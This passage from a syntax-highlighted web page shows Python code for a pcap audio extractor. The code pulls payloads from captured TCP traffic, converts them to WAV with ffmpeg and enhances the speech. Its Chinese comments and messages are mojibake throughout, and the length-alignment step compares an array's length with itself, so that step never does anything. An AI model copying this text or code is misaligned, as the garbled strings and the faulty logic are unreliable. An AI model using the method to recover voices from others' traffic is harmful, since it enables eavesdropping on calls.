class="built_in">len</span>(tcp_streams)&#125;</span> ä¸ªTCPæµ&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># å¤„ç†æ¯ä¸ªTCPæµ</span></span><br><span class="line">            <span class="keyword">for</span> i, (stream_key, payloads) <span class="keyword">in</span> <span class="built_in">enumerate</span>(tcp_streams.items()):</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(payloads) &lt; <span class="number">10</span>:  <span class="comment"># å¤ªå°‘çš„åŒ…å¯èƒ½ä¸æ˜¯éŸ³é¢‘æµ</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                    </span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;å¤„ç†TCPæµ <span class="subst">&#123;i+<span class="number">1</span>&#125;</span>: <span class="subst">&#123;stream_key&#125;</span>&quot;</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># åˆå¹¶è½½è·</span></span><br><span class="line">                raw_data = <span class="string">b&#x27;&#x27;</span>.join(payloads)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># ä¿å­˜åŸå§‹æ•°æ®</span></span><br><span class="line">                raw_file = os.path.join(<span class="variable language_">self</span>.temp_dir, <span class="string">f&quot;tcp_<span class="subst">&#123;i&#125;</span>.raw&quot;</span>)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(raw_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(raw_data)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># å°è¯•è½¬æ¢ä¸ºWAV</span></span><br><span class="line">                wav_files = <span class="variable language_">self</span>._try_convert_to_wav(raw_file, output_dir, <span class="string">f&quot;tcp_stream_<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>&quot;</span>)</span><br><span class="line">                extracted_files.extend(wav_files)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;æå–TCPæµæ—¶å‡ºé”™: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> extracted_files</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_extract_raw_audio</span>(<span class="params">self, pcap_file, output_dir</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;å°è¯•æå–åŸå§‹éŸ³é¢‘æ•°æ®&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n=== å°è¯•æå–åŸå§‹éŸ³é¢‘æ•°æ® ===&quot;</span>)</span><br><span class="line">        extracted_files = []</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># ä½¿ç”¨scapyè¯»å–æ‰€æœ‰å¯èƒ½çš„è½½è·</span></span><br><span class="line">            packets = rdpcap(pcap_file)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># æ”¶é›†æ‰€æœ‰å¯èƒ½çš„è½½è·</span></span><br><span class="line">            all_payloads = []</span><br><span class="line">            <span class="keyword">for</span> packet <span class="keyword">in</span> packets:</span><br><span class="line">                <span class="keyword">if</span> packet.haslayer(Raw):</span><br><span class="line">                    payload = <span class="built_in">bytes</span>(packet[Raw])</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">len</span>(payload) &gt; <span class="number">100</span>:  <span class="comment"># åªå¤„ç†è¾ƒå¤§çš„è½½è·</span></span><br><span class="line">                        all_payloads.append(payload)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> all_payloads:</span><br><span class="line">                <span class="comment"># åˆå¹¶æ‰€æœ‰è½½è·</span></span><br><span class="line">                raw_data = <span class="string">b&#x27;&#x27;</span>.join(all_payloads)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># ä¿å­˜ä¸ºä¸´æ—¶æ–‡ä»¶</span></span><br><span class="line">                raw_file = os.path.join(<span class="variable language_">self</span>.temp_dir, <span class="string">&quot;raw_pcap.bin&quot;</span>)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(raw_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(raw_data)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># å°è¯•è½¬æ¢ä¸ºWAV</span></span><br><span class="line">                wav_files = <span class="variable language_">self</span>._try_convert_to_wav(raw_file, output_dir, <span class="string">&quot;raw_pcap_data&quot;</span>)</span><br><span class="line">                extracted_files.extend(wav_files)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;æå–åŸå§‹æ•°æ®æ—¶å‡ºé”™: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> extracted_files</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_try_convert_to_wav</span>(<span class="params">self, raw_file, output_dir, base_name</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;å°è¯•ä½¿ç”¨å¤šç§ç¼–ç æ ¼å¼å°†åŸå§‹æ–‡ä»¶è½¬æ¢ä¸ºWAV&quot;&quot;&quot;</span></span><br><span class="line">        converted_files = []</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># æ£€æŸ¥æ–‡ä»¶å¤§å°</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(raw_file) <span class="keyword">or</span> os.path.getsize(raw_file) &lt; <span class="number">1000</span>:  <span class="comment"># å¤ªå°å¯èƒ½ä¸æ˜¯éŸ³é¢‘</span></span><br><span class="line">            <span class="keyword">return</span> converted_files</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># å¸¸è§çš„éŸ³é¢‘æ ¼å¼å’Œå‚æ•°ç»„åˆ</span></span><br><span class="line">        formats_to_try = [</span><br><span class="line">            <span class="comment"># (æ ¼å¼, é‡‡æ ·ç‡, å£°é“æ•°, æè¿°)</span></span><br><span class="line">            (<span class="string">&#x27;mulaw&#x27;</span>, <span class="number">8000</span>, <span class="number">1</span>, <span class="string">&#x27;G.711_Î¼-law_8kHz_mono&#x27;</span>),</span><br><span class="line">            (<span class="string">&#x27;alaw&#x27;</span>, <span class="number">8000</span>, <span class="number">1</span>, <span class="string">&#x27;G.711_A-law_8kHz_mono&#x27;</span>),</span><br><span class="line">            (<span class="string">&#x27;mulaw&#x27;</span>, <span class="number">16000</span>, <span class="number">1</span>, <span class="string">&#x27;G.711_Î¼-law_16kHz_mono&#x27;</span>),</span><br><span class="line">            (<span class="string">&#x27;alaw&#x27;</span>, <span class="number">16000</span>, <span class="number">1</span>, <span class="string">&#x27;G.711_A-law_16kHz_mono&#x27;</span>),</span><br><span class="line">            (<span class="string">&#x27;s16le&#x27;</span>, <span class="number">8000</span>, <span class="number">1</span>, <span class="string">&#x27;PCM_16bit_8kHz_mono&#x27;</span>),</span><br><span class="line">            (<span class="string">&#x27;s16le&#x27;</span>, <span class="number">16000</span>, <span class="number">1</span>, <span class="string">&#x27;PCM_16bit_16kHz_mono&#x27;</span>),</span><br><span class="line">            (<span class="string">&#x27;s16le&#x27;</span>, <span class="number">44100</span>, <span class="number">1</span>, <span class="string">&#x27;PCM_16bit_44.1kHz_mono&#x27;</span>),</span><br><span class="line">            (<span class="string">&#x27;s16le&#x27;</span>, <span class="number">48000</span>, <span class="number">1</span>, <span class="string">&#x27;PCM_16bit_48kHz_mono&#x27;</span>),</span><br><span class="line">        ]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># æ£€æŸ¥ffmpegæ˜¯å¦å¯ç”¨</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>._check_ffmpeg():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;æœªæ‰¾åˆ°ffmpegï¼Œæ— æ³•è½¬æ¢éŸ³é¢‘æ ¼å¼&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> converted_files</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># å°è¯•æ¯ç§æ ¼å¼</span></span><br><span class="line">        <span class="keyword">for</span> fmt, rate, channels, desc <span class="keyword">in</span> formats_to_try:</span><br><span class="line">            output_file = os.path.join(output_dir, <span class="string">f&quot;<span class="subst">&#123;base_name&#125;</span>_<span class="subst">&#123;desc&#125;</span>.wav&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                cmd = [</span><br><span class="line">                    <span class="string">&#x27;ffmpeg&#x27;</span>, <span class="string">&#x27;-y&#x27;</span>,  <span class="comment"># -y è¦†ç›–å·²å­˜åœ¨æ–‡ä»¶</span></span><br><span class="line">                    <span class="string">&#x27;-f&#x27;</span>, fmt,</span><br><span class="line">                    <span class="string">&#x27;-ar&#x27;</span>, <span class="built_in">str</span>(rate),</span><br><span class="line">                    <span class="string">&#x27;-ac&#x27;</span>, <span class="built_in">str</span>(channels),</span><br><span class="line">                    <span class="string">&#x27;-i&#x27;</span>, raw_file,</span><br><span class="line">                    output_file</span><br><span class="line">                ]</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># è¿è¡Œffmpeg</span></span><br><span class="line">                result = subprocess.run(cmd, capture_output=<span class="literal">True</span>, timeout=<span class="number">10</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># æ£€æŸ¥æ˜¯å¦æˆåŠŸç”Ÿæˆæ–‡ä»¶ä¸”æ–‡ä»¶å¤§å°åˆç†</span></span><br><span class="line">                <span class="keyword">if</span> (result.returncode == <span class="number">0</span> <span class="keyword">and</span> </span><br><span class="line">                    os.path.exists(output_file) <span class="keyword">and</span> </span><br><span class="line">                    os.path.getsize(output_file) &gt; <span class="number">1024</span>):  <span class="comment"># è‡³å°‘1KB</span></span><br><span class="line">                    </span><br><span class="line">                    <span class="comment"># éªŒè¯WAVæ–‡ä»¶</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="variable language_">self</span>._validate_wav_file(output_file):</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;  âœ“ æˆåŠŸè½¬æ¢: <span class="subst">&#123;desc&#125;</span>&quot;</span>)</span><br><span class="line">                        converted_files.append(output_file)</span><br><span class="line">                        <span class="comment"># æˆåŠŸä¸€ä¸ªå°±åœæ­¢ï¼Œé¿å…é‡å¤è½¬æ¢</span></span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="comment"># åˆ é™¤æ— æ•ˆæ–‡ä»¶</span></span><br><span class="line">                        os.remove(output_file)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="comment"># åˆ é™¤å¯èƒ½åˆ›å»ºçš„æ— æ•ˆæ–‡ä»¶</span></span><br><span class="line">                    <span class="keyword">if</span> os.path.exists(output_file):</span><br><span class="line">                        os.remove(output_file)</span><br><span class="line">                        </span><br><span class="line">            <span class="keyword">except</span> (subprocess.TimeoutExpired, Exception) <span class="keyword">as</span> e:</span><br><span class="line">                <span class="comment"># åˆ é™¤å¯èƒ½åˆ›å»ºçš„æ— æ•ˆæ–‡ä»¶</span></span><br><span class="line">                <span class="keyword">if</span> os.path.exists(output_file):</span><br><span class="line">                    os.remove(output_file)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> converted_files</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_validate_wav_file</span>(<span class="params">self, wav_file</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;éªŒè¯WAVæ–‡ä»¶æ˜¯å¦æœ‰æ•ˆ&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> wave.<span class="built_in">open</span>(wav_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> wav:</span><br><span class="line">                <span class="comment"># æ£€æŸ¥åŸºæœ¬å‚æ•°</span></span><br><span class="line">                frames = wav.getnframes()</span><br><span class="line">                rate = wav.getframerate()</span><br><span class="line">                channels = wav.getnchannels()</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># å¦‚æœå¸§æ•°å¤ªå°‘ï¼Œå¯èƒ½ä¸æ˜¯æœ‰æ•ˆéŸ³é¢‘</span></span><br><span class="line">                <span class="keyword">if</span> frames &lt; <span class="number">100</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                    </span><br><span class="line">                <span class="comment"># å°è¯•è¯»å–ä¸€äº›æ•°æ®</span></span><br><span class="line">                data = wav.readframes(<span class="built_in">min</span>(<span class="number">1000</span>, frames))</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(data) == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                    </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_check_ffmpeg</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;æ£€æŸ¥ffmpegæ˜¯å¦å¯ç”¨&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            subprocess.run([<span class="string">&#x27;ffmpeg&#x27;</span>, <span class="string">&#x27;-version&#x27;</span>], capture_output=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_enhance_all_audio</span>(<span class="params">self, output_dir</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;å¢å¼ºæ‰€æœ‰æå–çš„éŸ³é¢‘æ–‡ä»¶&quot;&quot;&quot;</span></span><br><span class="line">        enhanced_files = []</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># è·å–æ‰€æœ‰WAVæ–‡ä»¶</span></span><br><span class="line">        wav_files = [f <span class="keyword">for</span> f <span class="keyword">in</span> <span class="variable language_">self</span>.extracted_files <span class="keyword">if</span> f.endswith(<span class="string">&#x27;.wav&#x27;</span>)]</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> wav_files:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;æ²¡æœ‰æ‰¾åˆ°WAVæ–‡ä»¶è¿›è¡Œå¢å¼º&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> enhanced_files</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;å°†å¯¹ <span class="subst">&#123;<span class="built_in">len</span>(wav_files)&#125;</span> ä¸ªéŸ³é¢‘æ–‡ä»¶è¿›è¡Œå¢å¼º&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> wav_file <span class="keyword">in</span> wav_files:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                enhanced_file = <span class="variable language_">self</span>._enhance_single_audio(wav_file)</span><br><span class="line">                <span class="keyword">if</span> enhanced_file:</span><br><span class="line">                    enhanced_files.append(enhanced_file)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;  âœ“ å¢å¼ºå®Œæˆ: <span class="subst">&#123;os.path.basename(enhanced_file)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  âœ— å¢å¼ºå¤±è´¥ <span class="subst">&#123;os.path.basename(wav_file)&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> enhanced_files</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_enhance_single_audio</span>(<span class="params">self, input_file</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;å¢å¼ºå•ä¸ªéŸ³é¢‘æ–‡ä»¶&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.have_enhance_deps:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># è¯»å–WAVæ–‡ä»¶</span></span><br><span class="line">            <span class="keyword">with</span> wave.<span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> wf:</span><br><span class="line">                nch = wf.getnchannels()</span><br><span class="line">                sw = wf.getsampwidth()</span><br><span class="line">                sr = wf.getframerate()</span><br><span class="line">                n_frames = wf.getnframes()</span><br><span class="line">                data = wf.readframes(n_frames)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># åªå¤„ç†16ä½PCM</span></span><br><span class="line">            <span class="keyword">if</span> sw != <span class="number">2</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  [!] è·³è¿‡é16ä½PCMæ–‡ä»¶: <span class="subst">&#123;os.path.basename(input_file)&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># è½¬æ¢ä¸ºnumpyæ•°ç»„</span></span><br><span class="line">            audio_int16 = np.frombuffer(data, dtype=np.int16)</span><br><span class="line">            audio_float32 = audio_int16.astype(np.float32)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># å¦‚æœæ˜¯ç«‹ä½“å£°ï¼Œè½¬æ¢ä¸ºå•å£°é“</span></span><br><span class="line">            <span class="keyword">if</span> nch == <span class="number">2</span>:</span><br><span class="line">                audio_float32 = audio_float32.reshape(-<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">                audio_float32 = np.mean(audio_float32, axis=<span class="number">1</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 1. å»é™¤DCåç§»å¹¶å½’ä¸€åŒ–</span></span><br><span class="line">            audio_float32 = audio_float32 - np.mean(audio_float32)</span><br><span class="line">            audio_float32 = audio_float32 / <span class="number">32768.0</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 2. åº”ç”¨è¯­éŸ³é¢‘æ®µæ»¤æ³¢å™¨ (300-3400Hz)</span></span><br><span class="line">            nyquist = sr / <span class="number">2.0</span></span><br><span class="line">            low = <span class="number">300.0</span> / nyquist</span><br><span class="line">            high = <span class="number">3400.0</span> / nyquist</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> high &gt; low:</span><br><span class="line">                b, a = signal.butter(<span class="number">4</span>, [low, high], btype=<span class="string">&#x27;band&#x27;</span>)</span><br><span class="line">                audio_float32 = signal.filtfilt(b, a, audio_float32)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 3. é¢‘åŸŸå™ªå£°é—¨</span></span><br><span class="line">            <span class="comment"># ä½¿ç”¨ç®€å•çš„STFTé™å™ª</span></span><br><span class="line">            f, t, Zxx = signal.stft(audio_float32, fs=sr, nperseg=<span class="number">256</span>, noverlap=<span class="number">128</span>, boundary=<span class="literal">None</span>)</span><br><span class="line">            magnitude = np.<span class="built_in">abs</span>(Zxx)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># ä¼°è®¡å™ªå£°åŸºåº•</span></span><br><span class="line">            noise_floor = np.median(magnitude, axis=<span class="number">1</span>, keepdims=<span class="literal">True</span>)</span><br><span class="line">            threshold = noise_floor * <span class="number">1.5</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># åº”ç”¨å™ªå£°é—¨</span></span><br><span class="line">            gain_mask = np.where(magnitude &gt;= threshold, <span class="number">1.0</span>, <span class="number">0.25</span>)</span><br><span class="line">            Zxx_denoised = Zxx * gain_mask</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># é€†STFT</span></span><br><span class="line">            _, audio_float32 = signal.istft(Zxx_denoised, fs=sr, nperseg=<span class="number">256</span>, noverlap=<span class="number">128</span>, boundary=<span class="literal">None</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># ç¡®ä¿é•¿åº¦ä¸€è‡´</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(audio_float32) &gt; <span class="built_in">len</span>(audio_float32):</span><br><span class="line">                audio_float32 = audio_float32[:<span class="built_in">len</span>(audio_float32)]</span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">len</span>(audio_float32) &lt; <span class="built_in">len</span>(audio_float32):</span><br><span class="line">                audio_float32 = np.pad(audio_float32, (<span class="number">0</span>, <span class="built_in">len</span>(audio_float32) - <span class="built_in">len</span>(audio_float32)))</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 4. åº”ç”¨å¢ç›Š</span></span><br><span class="line">            audio_float32 = audio_float32 * <span class="number">30.0</span>  <span class="comment"># 30å€å¢ç›Š</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 5. è½¯é™åˆ¶å™¨é˜²æ­¢å‰Šæ³¢</span></span><br><span class="line">            abs_signal = np.<span class="built_in">abs</span>(audio_float32)</span><br><span class="line">            signal_sign = np.sign(audio_float32)</span><br><span class="line">            </span><br><span class="line">            above_threshold = abs_signal &gt; <span class="number">0.8</span></span><br><span class="line">            processed_magnitude = abs_signal.copy()</span><br><span class="line">            processed_magnitude[above_threshold] = <span class="number">0.8</span> + (abs_signal[above_threshold] - <span class="number">0.8</span>) / <span class="number">6.0</span></span><br><span class="line">            </span><br><span class="line">            audio_float32 = signal_sign * processed_magnitude</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 6. æœ€ç»ˆè£å‰ªåˆ°[-1.0, 1.0]</span></span><br><span class="line">            audio_float32 = np.clip(audio_float32, -<span class="number">1.0</span>, <span class="number">1.0</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># è½¬æ¢å›16ä½æ•´æ•°</span></span><br><span class="line">            audio_int16 = (audio_float32 * <span class="number">32767.0</span>).astype(np.int16)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># åˆ›å»ºè¾“å‡ºæ–‡ä»¶å</span></span><br><span class="line">            base_name = os.path.splitext(input_file)[<span class="number">0</span>]</span><br><span class="line">            enhanced_file = <span class="string">f&quot;<span class="subst">&#123;base_name&#125;</span>_enhanced.wav&quot;</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># ä¿å­˜å¢å¼ºåçš„æ–‡ä»¶</span></span><br><span class="line">            <span class="keyword">with</span> wave.<span class="built_in">open</span>(enhanced_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> wf:</span><br><span class="line">                wf.setnchannels(<span class="number">1</span>)  <span class="comment"># è¾“å‡ºä¸ºå•å£°é“</span></span><br><span class="line">                wf.setsampwidth(<span class="number">2</span>)  <span class="comment"># 16ä½</span></span><br><span class="line">                wf.setframerate(sr)</span><br><span class="line">                wf.writeframes(audio_int16.tobytes())</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> enhanced_file</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;å¢å¼ºéŸ³é¢‘æ—¶å‡ºé”™: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_print_summary</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;æ‰“å°æå–ç»“æœæ‘˜è¦&quot;&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;æå–ç»“æœæ‘˜è¦&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.extracted_files:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;æœªæ‰¾åˆ°ä»»ä½•éŸ³é¢‘æ–‡ä»¶&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># åˆ†ç±»ç»Ÿè®¡</span></span><br><span class="line">        original_files = [f <span class="keyword">for</span> f <span class="keyword">in</span> <span class="variable language_">self</span>.extracted_files <span class="keyword">if</span> <span class="keyword">not</span> f.endswith(<span class="string">&#x27;_enhanced.wav&#x27;</span>)]</span><br><span class="line">        enhanced_files = [f <span class="keyword">for</span> f <span class="keyword">in</span> <span class="variable language_">self</span>.extracted_files <span class="keyword">if</span> f.endswith(<span class="string">&#x27;_enhanced.wav&#x27;</span>)]</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;æˆåŠŸæå– <span class="subst">&#123;<span class="built_in">len</span>(original_files)&#125;</span> ä¸ªåŸå§‹éŸ³é¢‘æ–‡ä»¶:&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i, file_path <span class="keyword">in</span> <span class="built_in">enumerate</span>(original_files, <span class="number">1</span>):</span><br><span class="line">            file_size = os.path.getsize(file_path)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  <span class="subst">&#123;i&#125;</span>. <span class="subst">&#123;os.path.basename(file_path)&#125;</span> (<span class="subst">&#123;file_size&#125;</span> å­—èŠ‚)&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> enhanced_files:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\næˆåŠŸç”Ÿæˆ <span class="subst">&#123;<span class="built_in">len</span>(enhanced_files)&#125;</span> ä¸ªå¢å¼ºéŸ³é¢‘æ–‡ä»¶:&quot;</span>)</span><br><span class="line">            <span class="keyword">for</span> i, file_path <span class="keyword">in</span> <span class="built_in">enumerate</span>(enhanced_files, <span class="number">1</span>):</span><br><span class="line">                file_size = os.path.getsize(file_path)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  <span class="subst">&#123;i&#125;</span>. <span class="subst">&#123;os.path.basename(file_path)&#125;</span> (<span class="subst">&#123;file_size&#125;</span> å­—èŠ‚)&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\næ‰€æœ‰æ–‡ä»¶å·²ä¿å­˜åˆ°: <span class="subst">&#123;os.path.dirname(self.extracted_files[<span class="number">0</span>])&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨ç¤ºä¾‹</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ç”¨æ³•: python audio_extractor.py &lt;pcapæ–‡ä»¶&gt; [è¾“å‡ºç›®å½•] [æ˜¯å¦å¢å¼ºéŸ³é¢‘]&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ç¤ºä¾‹: python audio_extractor.py voice_traffic.pcap extracted_audio&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ç¤ºä¾‹: python audio_extractor.py voice_traffic.pcap extracted_audio false (ä¸å¢å¼ºéŸ³é¢‘)&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    pcap_file = sys.argv[<span class="number">1</span>]</span><br><span class="line">    output_dir = sys.argv[<span class="number">2</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">2</span> <span class="keyword">else</span> <span class="string">&quot;extracted_audio&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># é»˜è®¤å¯ç”¨éŸ³é¢‘å¢å¼º</span></span><br><span class="line">    enhance_audio = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">3</span> <span class="keyword">and</span> sys.argv[<span class="number">3</span>].lower() <span class="keyword">in</span> [<span class="string">&#x27;false&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;no&#x27;</span>]:</span><br><span class="line">        enhance_audio = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(pcap_file):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;é”™è¯¯: æ–‡ä»¶ &#x27;<span class="subst">&#123;pcap_file&#125;</span>&#x27; ä¸å­˜åœ¨&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    extractor = PCAPAudioExtractor(enhance_audio=enhance_audio)</span><br><span class="line">    extracted_files = extractor.extract_all_audio(pcap_file, 